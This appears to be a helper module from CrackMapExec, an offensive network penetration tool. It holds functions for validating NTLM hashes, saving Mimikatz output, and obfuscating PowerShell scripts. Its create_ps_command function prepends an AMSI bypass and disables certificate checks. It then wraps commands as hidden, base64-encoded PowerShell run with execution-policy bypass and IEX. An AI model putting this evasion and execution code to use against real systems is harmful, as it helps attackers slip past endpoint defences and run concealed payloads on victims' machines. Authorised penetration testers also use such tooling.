import random
import string
import re
import cme
import os
import logging
from base64 import b64encode
from termcolor import colored

def gen_random_string(length=10):
	return ''.join(random.sample(string.ascii_letters, int(length)))

def validate_ntlm(data):
    allowed = re.compile("^[0-9a-f]{32}", re.IGNORECASE)
    if allowed.match(data):
        return True
    else:
        return False

def get_ps_script(path):
    return os.path.join(os.path.dirname(cme.__file__), 'data', path)

def write_log(data, log_name):
    logs_dir = os.path.join(os.path.expanduser('~/.cme'), 'logs')
    with open(os.path.join(logs_dir, log_name), 'w') as mimikatz_output:
        mimikatz_output.write(data)

def obfs_ps_script(script, function_name=None):
    """
    Strip block comments, line comments, empty lines, verbose statements,
    and debug statements from a PowerShell source file.

    If the function_name paramater is passed, replace the main powershell function name with it
    """
    if function_name:
        function_line = script.split('\n', 1)[0]
        if function_line.find('function') != -1:
            script = re.sub('-.*', '-{}\r'.format(function_name), script, count=1)

    # strip block comments
    strippedCode = re.sub(re.compile('<#.*?#>', re.DOTALL), '', script)
    # strip blank lines, lines starting with #, and verbose/debug statements
    strippedCode = "\n".join([line for line in strippedCode.split('\n') if ((line.strip() != '') and (not line.strip().startswith("#")) and (not line.strip().lower().startswith("write-verbose ")) and (not line.strip().lower().startswith("write-debug ")) )])
    return strippedCode

def create_ps_command(ps_command, force_ps32=False):
    ps_command = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
try{{ 
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
}}catch{{}}
{}
""".format(ps_command)

    logging.debug('Unincoded command:\n' + ps_command)

    if force_ps32:
        command = """$command = '{}'
if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64') 
{{
    
    $exec = $Env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded ' + $command
    IEX $exec
}}
else
{{
    $exec = [System.Convert]::FromBase64String($command)
    $exec = [Text.Encoding]::Unicode.GetString($exec)
    IEX $exec

}}""".format(b64encode(ps_command.encode('UTF-16LE')))

        command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))

    elif not force_ps32:
        command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(ps_command.encode('UTF-16LE')))

    return command 

def highlight(text, color='yellow'):
    if color == 'yellow':
        return u'{}'.format(colored(text, 'yellow', attrs=['bold']))
    elif color == 'red':
        return u'{}'.format(colored(text, 'red', attrs=['bold']))